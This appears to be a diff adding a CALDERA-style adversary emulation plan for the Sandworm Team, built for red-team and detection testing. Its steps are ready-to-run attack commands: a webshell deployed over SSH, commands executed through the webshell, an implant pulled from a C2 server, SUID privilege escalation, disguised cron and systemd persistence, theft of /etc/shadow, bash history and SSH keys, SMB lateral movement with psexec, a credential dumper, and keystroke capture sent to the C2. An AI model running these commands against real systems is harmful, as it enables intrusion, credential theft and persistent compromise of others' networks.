@@ -1,0 +1,983 @@
+# sandworm.yaml - CALDERA Style TTPs
+
+- emulation_plan_details:
+    id: c397ca4d-3c68-414e-9f78-2a96a11edbef
+    adversary_name: Sandworm Team (G0034)
+    adversary_description: Sandworm is a destructive threat group attributed to Russian GRU.
+    attack_version: 8
+    format_version: 1.0
+
+# Step 11 - Initial Compromise
+
+- id: 60c4ddd6-2ce0-4f5c-8ddb-c5eccd744686
+  name: Sandworm Initial Compromise - Transfer Webshell
+  description: |
+    Sandworm logs into patient zero via SSH using Valid Accounts. It is unknown how Sandworm obtained the credentials
+    (perhaps an SSH password guessing attack, or zero day exploit).
+    Sandworm then deploys a PHP webshell for persistent access. This ability must be run by an agent running on the
+    attacker-controlled machine (e.g. on the C2 server itself), since it will target patient zero. Requires sshpass
+    to be installed on attacker-controlled machine (sudo apt install sshpass).
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  cti_source: "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
+  procedure_group: procedure_command_and_control
+  procedure_step: 11.A.1-3
+  platforms:
+    linux:
+      sh:
+        command: |
+          chmod a+r obfuscated_webShell.php;
+          sshpass -p #{initial.user.password} scp ./obfuscated_webShell.php #{initial.user.name}@#{initial.target.host}:/tmp/search.php
+        payloads:
+          - obfuscated_webShell.php
+        cleanup: |
+          sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.host} "sudo rm -f /var/www/html/search.php";
+
+  input_arguments:
+    initial.user.name:
+      description: The name of the target user account for initial access.
+      type: string
+      default: fherbert
+    initial.target.host:
+      description: The hostname or IPv4 address of the target host for initial access.
+      type: string
+      default: 10.0.1.5
+    initial.user.password:
+      description: The password of the target user account for initial access.
+      type: string
+      default: Whg42WbhhCE17FEzrqeJ
+
+- id: 6249ff61-75ec-4ead-8ca2-e8d9fbbc225a
+  name: Sandworm Initial Compromise - Deploy Webshell
+  description: |
+    Sandworm logs into patient zero via SSH using Valid Accounts. It is unknown how Sandworm obtained the credentials
+    (perhaps an SSH password guessing attack, or zero day exploit).
+    Sandworm then deploys a PHP webshell for persistent access. This ability must be run by an agent running on the
+    attacker-controlled machine (e.g. on the C2 server itself), since it will target patient zero. Requires sshpass
+    to be installed on attacker-controlled machine (sudo apt install sshpass).
+  tactic: persistence
+  technique:
+    attack_id: T1505.003
+    name: "Server Software Component: Web Shell"
+  cti_source: "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
+  procedure_group: procedure_persistence
+  procedure_step: 11.A.4
+  platforms:
+    linux:
+      sh:
+        command: |
+          sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.host} "sudo mv /tmp/search.php /var/www/html/";
+        cleanup: |
+          sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.host} "sudo rm -f /var/www/html/centreon_module_linux_app64";
+          sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.host} 'printf "ps auxf | grep -i httpd\nnetstat -antp | grep -i httpd\n" | sudo tee /var/www/html/include/tools/check.sh > /dev/null'
+
+  input_arguments:
+    initial.user.name:
+      description: The name of the target user account for initial access.
+      type: string
+      default: fherbert
+    initial.target.host:
+      description: The hostname or IPv4 address of the target host for initial access.
+      type: string
+      default: 10.0.1.5
+    initial.user.password:
+      description: The password of the target user account for initial access.
+      type: string
+      default: Whg42WbhhCE17FEzrqeJ
+
+# Step 12 - Initial Discovery
+
+- id: 06dd8117-caaf-4535-a70f-cc31268fd9b8
+  name: Sandworm Initial Discovery via Webshell - Whoami
+  description: |
+    Sandworm collects the username from a compromised host by issuing shell commands through the PHP webshell.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.
+  tactic: discovery
+  technique:
+    attack_id: T1033
+    name: System Owner/User Discovery
+  cti_source: "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: 12.A.1-2
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl --insecure "https://#{initial.target.host}/search.php?cmd=whoami" 2>/dev/null
+
+  input_arguments:
+    initial.target.host:
+      description: The hostname or IPv4 address of the initial target host for web shell commands.
+      type: string
+      default: 10.0.1.5
+
+- id: 75efc0b8-eafa-4300-8e7b-5e56179944e8
+  name: Sandworm Initial Discovery via Webshell - Uname
+  description: |
+    Sandworm enumerates information about the infected system's operating system by issuing shell commands through the
+    PHP webshell.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
+  cti_source: "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: 12.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl --insecure "https://#{initial.target.host}/search.php?cmd=uname+-a" 2>/dev/null
+
+  input_arguments:
+    initial.target.host:
+      description: The hostname or IPv4 address of the initial target host for web shell commands.
+      type: string
+      default: 10.0.1.5
+
+- id: 65dd006d-a76e-423d-83f2-6c29b66690e1
+  name: Sandworm Initial Discovery via Webshell - ls
+  description: |
+    Sandworm enumerates files on a compromised host by issuing shell commands through the PHP webshell.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.
+  tactic: discovery
+  technique:
+    attack_id: T1083
+    name: File and Directory Discovery
+  cti_source: "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: 12.A.4
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl --insecure "https://#{initial.target.host}/search.php?cmd=ls+-lsahR+/" 2>/dev/null
+
+  input_arguments:
+    initial.target.host:
+      description: The hostname or IPv4 address of the initial target host for web shell commands.
+      type: string
+      default: 10.0.1.5
+
+- id: c7e4a043-e67a-4199-8e52-d7d5219a7614
+  name: Sandworm Initial Discovery via Webshell - cat /etc/passwd
+  description: |
+    Sandworm displays the /etc/passwd file on a compromised host by issuing shell commands through the PHP webshell.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.
+  tactic: credential-access
+  technique:
+    attack_id: T1003.008
+    name: "OS Credential Dumping: /etc/passwd and /etc/shadow"
+  cti_source: "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
+  procedure_group: procedure_credential_access
+  procedure_step: 12.A.5
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl --insecure "https://#{initial.target.host}/search.php?cmd=cat+/etc/passwd" 2>/dev/null
+
+  input_arguments:
+    initial.target.host:
+      description: The hostname or IPv4 address of the initial target host for web shell commands.
+      type: string
+      default: 10.0.1.5
+
+# Step 13 - Upload and Execute Exaramel (Linux Variant)
+
+- id: a85bd5a0-c977-4fd1-b339-97fffed54f8c
+  name: Sandworm Download Agent Executable
+  description: |
+    Sandworm downloads an ELF executable from the control server using curl.
+    Once downloaded to disk, Sandworm sets the file permissions to read-write-execute.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  cti_source: "https://www.justice.gov/opa/press-release/file/1328521/download"
+  procedure_group: procedure_command_and_control
+  procedure_step: 13.A.1
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl --insecure "https://#{initial.target.host}/search.php?cmd=curl+--insecure+-X+POST+-H+file:sandcat.go+-H+platform:linux+-H+server:#{server}+-H+group:caladan+#{server}/file/download+-o+centreon_module_linux_app64" 2>/dev/null;
+          curl --insecure "https://#{initial.target.host}/search.php?cmd=ls+-lsah" 2>/dev/null;
+          curl --insecure "https://#{initial.target.host}/search.php?cmd=chmod+755+centreon_module_linux_app64" 2>/dev/null;
+
+  input_arguments:
+    initial.target.host:
+      description: The hostname or IPv4 address of the initial target host.
+      type: string
+      default: 10.0.1.5
+
+- id: decf0a4d-6ff1-474f-af0c-5b652401a5e4
+  name: Sandworm Set Up SUID for Agent Execution
+  description: |
+    Sandworm executes the downloaded agent executable by running SUID binary /bin/backup.
+    This binary executes check.sh, which causes the agent to be executed with root privileges.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.001
+    name: "Abuse Elevation Control Mechanism: Setuid and Setgid"
+  cti_source: "https://www.justice.gov/opa/press-release/file/1328521/download"
+  procedure_group: procedure_privilege_escalation
+  procedure_step: 13.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl --insecure "https://#{initial.target.host}/search.php?cmd=echo%20%27%2Fvar%2Fwww%2Fhtml%2Fcentreon_module_linux_app64%20%26%27%20%3E%3E%20%2Fvar%2Fwww%2Fhtml%2Finclude%2Ftools%2Fcheck.sh" 2>/dev/null;
+
+  input_arguments:
+    initial.target.host:
+      description: The hostname or IPv4 address of the initial target host.
+      type: string
+      default: 10.0.1.5
+
+- id: 8ba8405b-d8b9-4c9d-ae8e-3b21ae8f64c6
+  name: Sandworm Execute Agent via SUID Binary
+  description: |
+    Sandworm executes the downloaded agent executable by running SUID binary /bin/backup.
+    This binary executes check.sh, which causes the agent to be executed with root privileges.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.001
+    name: "Abuse Elevation Control Mechanism: Setuid and Setgid"
+  cti_source: "https://www.justice.gov/opa/press-release/file/1328521/download"
+  procedure_group: procedure_privilege_escalation
+  procedure_step: 13.A.2-5
+  platforms:
+    linux:
+      proc:
+        command: |
+          exec-background curl -s --insecure "https://#{initial.target.host}/search.php?cmd=/bin/backup"
+
+  input_arguments:
+    initial.target.host:
+      description: The hostname or IPv4 address of the initial target host.
+      type: string
+      default: 10.0.1.5
+
+- id: c3f875d8-ab9b-46ef-acf6-7926f7b93d78
+  name: Sandworm Wait For Priv Esc Agent Beacon
+  description: |
+    Wait for the SUID privilege escalation to spawn an elevated agent beacon.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself).
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.001
+    name: "Abuse Elevation Control Mechanism: Setuid and Setgid"
+  cti_source: "https://www.justice.gov/opa/press-release/file/1328521/download"
+  procedure_group: procedure_privilege_escalation
+  procedure_step: 13.A.2-5
+  platforms:
+    linux:
+      sh:
+        command: |
+          sleep 40
+
+# Step 14 - Exaramel Linux Persistence
+
+- id: f6d72009-d093-461a-986c-e1ab9b04db51
+  name: Sandworm Establish Crontab Persistence
+  description: |
+    Sandworm establishes crontab persistence.
+  tactic: persistence
+  technique:
+    attack_id: T1053.003
+    name: "Scheduled Task/Job: Cron"
+  cti_source: "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
+  procedure_group: procedure_persistence
+  procedure_step: 14.A.1
+  platforms:
+    linux:
+      sh:
+        command: |
+          dir=$(dirname #{location});
+          croncontents=$(crontab -l 2>/dev/null);
+          printf "$croncontents\n1 * * * * cd $dir && #{exe_name}\n@reboot cd $dir && #{exe_name}\n" | crontab -
+        cleanup: |
+          crontab -r
+
+- id: 82d61362-0f60-45d9-a3e1-26ec20cb3387
+  name: Sandworm Establish Systemd Persistence
+  description: |
+    Sandworm establishes systemd persistence.
+  tactic: persistence
+  technique:
+    attack_id: T1543.002
+    name: "Create or Modify System Process: Systemd Service"
+  cti_source: "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
+  procedure_group: procedure_persistence
+  procedure_step: 14.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          printf "[Unit]\nDescription=Syslog daemon\n\n[Service]\nWorkingDirectory=$(dirname #{location})\nExecStartPre=/bin/rm -f /tmp/.applocktx\nExecStart=#{location}\nRestart=always\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/syslogd.service;
+          chmod 0644 /etc/systemd/system/syslogd.service;
+          systemctl enable syslogd.service;
+          systemctl daemon-reload;
+        cleanup: |
+          systemctl disable syslogd.service;
+          systemctl stop syslogd.service;
+          rm -f /etc/systemd/system/syslogd.service;
+
+- id: 8e965415-40be-40f8-8786-da4f67748fef
+  name: Sandworm Read /etc/shadow
+  description: |
+    Sandworm reads /etc/shadow. Note: not in CTI but in TTP scope.
+  tactic: credential-access
+  technique:
+    attack_id: T1003.008
+    name: "OS Credential Dumping: /etc/passwd and /etc/shadow"
+  cti_source: "https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/"
+  procedure_group: procedure_credential_access
+  procedure_step: 14.A.3
+  platforms:
+    linux:
+      proc:
+        command: cat /etc/shadow
+
+- id: 40934e60-6b0d-4d3b-a8f5-ad111c6a0abc
+  name: Sandworm Get Bash History
+  description: |
+    Sandworm reads bash history. Note: not in CTI but in TTP scope.
+  tactic: credential-access
+  technique:
+    attack_id: T1552.003
+    name: "Unsecured Credentials: Bash History"
+  cti_source: "https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/"
+  procedure_group: procedure_credential_access
+  procedure_step: 14.A.4
+  platforms:
+    linux:
+      proc:
+        command: cat /home/#{initial.user.name}/.bash_history
+
+  input_arguments:
+    initial.user.name:
+      description: The name of the target user account for initial access.
+      type: string
+      default: fherbert
+
+- id: dc3152ac-1014-4f96-98c9-a64d5a61712e
+  name: Sandworm Get SSH Keys
+  description: |
+    Sandworm reads SSH keys. Note: not in CTI but in TTP scope.
+  tactic: credential-access
+  technique:
+    attack_id: T1552.004
+    name: "Unsecured Credentials: Private Keys"
+  cti_source: "https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/"
+  procedure_group: procedure_credential_access
+  procedure_step: 14.A.5
+  platforms:
+    linux:
+      sh:
+        command: |
+          cat /home/#{initial.user.name}/.ssh/id_rsa;
+          cat /home/#{initial.user.name}/.ssh/id_rsa.pub;
+
+  input_arguments:
+    initial.user.name:
+      description: The name of the target user account for initial access.
+      type: string
+      default: fherbert
+
+# Step 15 - Move laterally to Windows host
+
+- id: ee1e23ad-87d4-4d69-932f-2e5631508c8e
+  name: Sandworm Upload Agent to Windows Host
+  description: |
+    Sandworm Team has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.
+    Sandworm Team has used previously acquired legitimate credentials prior to attacks.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself).
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.002
+    name: "Remote Services: SMB/Windows Admin Shares"
+  cti_source: "https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 15.A.1-3
+  platforms:
+    linux:
+      sh:
+        command: |
+          server="#{server}";
+          curl -s -X POST -H "file:sandcat.go" -H "platform:windows" -H "server:$server" -H "group:gammu" $server/file/download > wsmprovav.exe;
+          chmod +x wsmprovav.exe;
+          smbclient -U 'WORKGROUP\#{second_host.user.name}' //#{second.target.host}/ADMIN$ -c "put ./wsmprovav.exe wsmprovav.exe;" "#{second_host.user.password}"
+        cleanup: |
+          rm wsmprovav.exe
+
+  input_arguments:
+    second_host.user.name:
+      description: The name of the target local user account for lateral movement. May be the same as the user for initial access.
+      type: string
+      default: fherbert
+    second.target.host:
+      description: The hostname or IPv4 address of the target host for lateral movement.
+      type: string
+      default: 10.0.1.7
+    second_host.user.password:
+      description: The password of the target user account for lateral movement. May be the same as the user for initial access.
+      type: string
+      default: Whg42WbhhCE17FEzrqeJ
+
+- id: 57771abd-0789-4dda-bb02-31359e6860db
+  name: Sandworm Service Creation/Execution and Registry Persistence
+  description: |
+    Uses psexec.py to gain a bind-shell to target over SMB (TCP 445).
+    Loads the registry hive for target user. Set registry persistence for target user only, which will
+    execute the previously uploaded agent executable.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself).
+  tactic: execution
+  technique:
+    attack_id: T1569.002
+    name: "System Services: Service Execution"
+  cti_source: "https://securelist.com/be2-custom-plugins-router-abuse-and-target-profiles/67353/"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 15.A.4-7
+  platforms:
+    linux:
+      sh:
+        timeout: 120
+        command: |
+          ./psexec_sandworm.py -service-name "Windows Check AV" WORKGROUP/#{second_host.user.name}:#{second_host.user.password}@#{second.target.host} cmd /c 'reg.exe LOAD HKU\Temp "C:\Users\#{second_host.user.name}\NTUSER.DAT" & reg.exe ADD HKU\Temp\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d "C:\Windows\wsmprovav.exe"' 2>&1
+        payloads:
+          - psexec_sandworm.py
+
+  input_arguments:
+    second_host.user.name:
+      description: The name of the target local user account for lateral movement. May be the same as the user for initial access.
+      type: string
+      default: fherbert
+    second.target.host:
+      description: The hostname or IPv4 address of the target host for lateral movement.
+      type: string
+      default: 10.0.1.7
+    second_host.user.password:
+      description: The password of the target user account for lateral movement. May be the same as the user for initial access.
+      type: string
+      default: Whg42WbhhCE17FEzrqeJ
+
+- id: c4c08a1f-15d6-4dfd-9ba7-9b61594762ff
+  name: Sandworm RDP to Execute Agent Implant
+  description: |
+    RDP into target host to trigger the registry persistence which will execute the uploaded agent implant.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself).
+  tactic: persistence
+  technique:
+    attack_id: T1547.001
+    name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+  cti_source: "https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html"
+  procedure_group: procedure_persistence
+  procedure_step: 15.A.7-10
+  platforms:
+    linux:
+      proc:
+        command: |
+          exec-background xfreerdp +clipboard /u:WORKGROUP\\#{second_host.user.name} /p:"#{second_host.user.password}" /v:#{second.target.host} /cert-ignore
+
+  input_arguments:
+    second_host.user.name:
+      description: The name of the target local user account for lateral movement. May be the same as the user for initial access.
+      type: string
+      default: fherbert
+    second.target.host:
+      description: The hostname or IPv4 address of the target host for lateral movement.
+      type: string
+      default: 10.0.1.7
+    second_host.user.password:
+      description: The password of the target user account for lateral movement. May be the same as the user for initial access.
+      type: string
+      default: Whg42WbhhCE17FEzrqeJ
+
+- id: 236fd943-2bd8-400a-9a63-33f724629ca4
+  name: Sandworm Wait For Lat Move Target Beacon
+  description: |
+    Wait for the registry persistence to trigger and for the new agent beacon to come in.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself).
+  tactic: persistence
+  technique:
+    attack_id: T1547.001
+    name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+  cti_source: "https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html"
+  procedure_group: procedure_persistence
+  procedure_step: 15.A.7-10
+  platforms:
+    linux:
+      sh:
+        command: |
+          sleep 40
+
+# Step 16 - Windows Discovery
+
+- id: e870a202-354f-4214-82e6-c5f88cb33b65
+  name: Sandworm Windows Discovery - Current User
+  description: |
+    Sandworm Team has collected the username from a compromised host.
+  tactic: discovery
+  technique:
+    attack_id: T1033
+    name: System Owner/User Discovery
+  cti_source: "https://www.justice.gov/opa/press-release/file/1328521/download"
+  procedure_group: procedure_discovery
+  procedure_step: 16.A.1
+  platforms:
+    windows:
+      proc:
+        command: whoami.exe
+
+- id: 90cbd004-d5e9-4b05-9abe-12b93f77ede3
+  name: Sandworm Windows Discovery - Windows Version Info
+  description: |
+    Sandworm Team enumerates information about the infected system's operating system.
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
+  cti_source: "https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/"
+  procedure_group: procedure_discovery
+  procedure_step: 16.A.2
+  platforms:
+    windows:
+      cmd:
+        command: |
+          reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName &
+          reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentMajorVersionNumber &
+          reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentMinorVersionNumber &
+          reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuild
+
+- id: fa3ea4c1-c980-41b1-be78-c8c932d68e98
+  name: Sandworm Windows Discovery - List Entire File System
+  description: |
+    Sandworm Team has enumerated files on a compromised host.
+  tactic: discovery
+  technique:
+    attack_id: T1083
+    name: File and Directory Discovery
+  cti_source: "https://www.justice.gov/opa/press-release/file/1328521/download"
+  procedure_group: procedure_discovery
+  procedure_step: 16.A.3
+  platforms:
+    windows:
+      cmd:
+        timeout: 180
+        command: |
+          dir /s /b C:\ > dir.out
+        uploads:
+          - dir.out
+        cleanup: |
+          del dir.out
+
+- id: 73decaa1-5ba3-4739-812d-633929a158fd
+  name: Sandworm Windows Discovery - List RDP Connections
+  description: |
+    Sandworm Team had gathered user, IP address, and server data related to RDP sessions on a compromised host.
+  tactic: discovery
+  technique:
+    attack_id: T1049
+    name: System Network Connections Discovery
+  cti_source: "https://www.justice.gov/opa/press-release/file/1328521/download"
+  procedure_group: procedure_discovery
+  procedure_step: 16.A.4-5
+  platforms:
+    windows:
+      cmd:
+        command: |
+          netstat -ano | findstr 3389
+
+# Step 17 - Credential Dumping
+
+- id: 9a438a2a-c95b-4fd2-a29f-8b1250fc3adc
+  name: Sandworm Download Web Credential Dumper
+  description: |
+    Sandworm downloads web credential dumper oradump.exe to disk.
+    oradump.exe is a variant of the open source tool, LaZagne.
+    It has been refactored, some functionality removed, and compiled into a portable executable via PyInstaller.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  cti_source: "https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/"
+  procedure_group: procedure_command_and_control
+  procedure_step: 17.A.1
+  platforms:
+    windows:
+      cmd:
+        command: |
+          move .\dumpWebBrowserCreds.exe C:\Windows\System32\oradump.exe
+        payloads:
+          - dumpWebBrowserCreds.exe
+
+- id: 1da1b17e-66fd-4f39-bf10-203570a62624
+  name: Sandworm Execute Web Credential Dumper
+  description: |
+    Sandworm executes web credential dumper oradump.exe.
+  tactic: credential-access
+  technique:
+    attack_id: T1555.003
+    name: "Credentials from Password Stores: Credentials from Web Browsers"
+  cti_source: "https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/"
+  procedure_group: procedure_credential_access
+  procedure_step: 17.A.2
+  platforms:
+    windows:
+      cmd:
+        timeout: 300
+        command: |
+          C:\Windows\System32\oradump.exe 2>&1
+
+- id: ccbb3c07-dc04-46f5-83d3-54fe71deab3c
+  name: Sandworm Download Keylogger
+  description: |
+    Sandworm downloads keylogger to disk.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  cti_source: "https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/"
+  procedure_group: procedure_command_and_control
+  procedure_step: 17.A.3
+  platforms:
+    windows:
+      cmd:
+        command: |
+          move .\keylogger.exe C:\Windows\System32\mslog.exe
+        payloads:
+          - keylogger.exe
+
+- id: 1d317399-d786-4c58-889f-01cf496ba5d2
+  name: Sandworm Log Keystrokes
+  description: |
+    Sandworm runs the keylogger in the background to log keystrokes to mslog.txt.
+    Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.
+  tactic: credential-access
+  technique:
+    attack_id: T1056.001
+    name: "Input Capture: Keylogging"
+  cti_source: "https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/"
+  procedure_group: procedure_credential_access
+  procedure_step: 17.A.4
+  platforms:
+    windows:
+      proc:
+        command: |
+          exec-background cmd.exe /k "C:\Windows\System32\mslog.exe -o C:\Windows\System32\mslog.txt"
+
+- id: e895decc-93fa-42bb-8609-3a62d14fcb60
+  name: Sandworm Let Keystroke Logger Run
+  description: |
+    Wait 30 seconds to allow the operator to perform keystrokes for logging.
+    Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.
+  tactic: credential-access
+  technique:
+    attack_id: T1056.001
+    name: "Input Capture: Keylogging"
+  cti_source: "https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/"
+  procedure_group: procedure_credential_access
+  procedure_step: 17.A.4
+  platforms:
+    linux:
+      sh:
+        command: |
+          sleep 30
+
+- id: 5c034afc-1f10-4e92-8d77-afed302d7de5
+  name: Sandworm Verify Keystroke File
+  description: |
+    Verifies that the mslog.txt file was created.
+  tactic: credential-access
+  technique:
+    attack_id: T1056.001
+    name: "Input Capture: Keylogging"
+  cti_source: "https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/"
+  procedure_group: procedure_credential_access
+  procedure_step: 17.A.4
+  platforms:
+    windows:
+      cmd:
+        command: |
+          dir C:\Windows\System32\mslog.txt
+
+- id: 854c63de-cc94-4581-81b0-4c2292123898
+  name: Sandworm Upload Keystroke File
+  description: |
+    Reads contents of the mslog.txt keystroke file and uploads the file to the C2 server.
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: Exfiltration Over C2 Channel
+  cti_source: "https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/"
+  procedure_group: procedure_exfiltration
+  procedure_step: 17.A.6
+  platforms:
+    windows:
+      cmd:
+        command: |
+          type C:\Windows\System32\mslog.txt
+        uploads:
+          - C:\Windows\System32\mslog.txt
+
+- id: 65639630-733c-4179-8543-2c64cb577ca0
+  name: Sandworm Stop Keystroke Logger
+  description: |
+    Terminates the mslog.exe keystroke process.
+  tactic: credential-access
+  technique:
+    attack_id: T1056.001
+    name: "Input Capture: Keylogging"
+  cti_source: "https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/"
+  procedure_group: procedure_credential_access
+  procedure_step: 17.A.6
+  platforms:
+    windows:
+      cmd:
+        command: |
+          taskkill /F /IM mslog.exe
+
+- id: 6222bcab-b7ec-4523-a236-273d48270649
+  name: Sandworm Remote System Discovery (dsquery)
+  description: |
+    Sandworm Enumerate all domain hosts via dsquery.exe in preparation for notpetya deployment.
+  tactic: discovery
+  technique:
+    attack_id: T1018
+    name: Remote System Discovery
+  cti_source: "https://www.welivesecurity.com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/"
+  procedure_group: procedure_discovery
+  procedure_step: 17.A.7
+  platforms:
+    windows:
+      cmd:
+        command: |
+          dsquery.exe computer -s #{dc.target.host} -u #{domain.admin.name} -p #{domain.admin.password}
+
+  input_arguments:
+    domain.admin.name:
+      description: The name of the target domain admin account to use.
+      type: string
+      default: patreides
+    domain.admin.password:
+      description: The password of the target domain admin account.
+      type: string
+      default: ebqMB7DmM81QVUqpf7XI
+    dc.target.host:
+      description: The hostname or IPv4 address of the domain controller.
+      type: string
+      default: 10.0.1.4
+
+- id: d91962e6-cb75-4f29-b2ce-36db15415e40
+  name: Sandworm Cleanup Artifacts
+  description: |
+    Sandworm Team has used backdoors that can delete files used in an attack from an infected system.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1070.004
+    name: "Indicator Removal on Host: File Deletion"
+  cti_source: "https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/"
+  procedure_group: procedure_defense_evasion
+  procedure_step: 17.A.8
+  platforms:
+    windows:
+      cmd:
+        command: |
+          del /Q C:\Windows\System32\oradump.exe C:\Windows\System32\mslog.exe C:\Windows\System32\mslog.txt
+
+- id: 2093de68-db55-4c75-82d1-3abd5fc58028
+  name: Terminate RDP Session to Second Target (Gammu)
+  description: |
+    End the RDP session to the second target.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since the RDP connection originates from the attacker's machine.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.001
+    name: "Remote Services: Remote Desktop Protocol"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 17.A.8
+  platforms:
+    linux:
+      proc:
+        command: |
+          pkill xfreerdp
+
+# Step 18 - Pivot to DC
+
+- id: 690e889f-5844-473e-98c5-c90c9f1772dc
+  name: Prepare Tools for Ingress Tool Transfer (Arrakis)
+  description: |
+    
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  cti_source: "https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/"
+  procedure_group: procedure_command_and_control
+  procedure_step: 18.A.1
+  platforms:
+    linux:
+      sh:
+        command: |
+          mkdir -p sw_tools;
+          server="#{server}";
+          curl -s -X POST -H "file:sandcat.go" -H "platform:windows" -H "server:$server" -H "group:arrakis" $server/file/download > perfc.exe;
+          chmod +x perfc.exe;
+          cp SharpNP.dll ./sw_tools/;
+          mv perfc.exe ./sw_tools/;
+        payloads:
+          - SharpNP.dll
+        cleanup: |
+          rm -rf sw_tools
+
+- id: 2f107b88-065f-4d91-9d46-212212b235d5
+  name: Lateral Movement Via RDP (Arrakis)
+  description: |
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since the RDP connection must originate from the attacker's machine.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.001
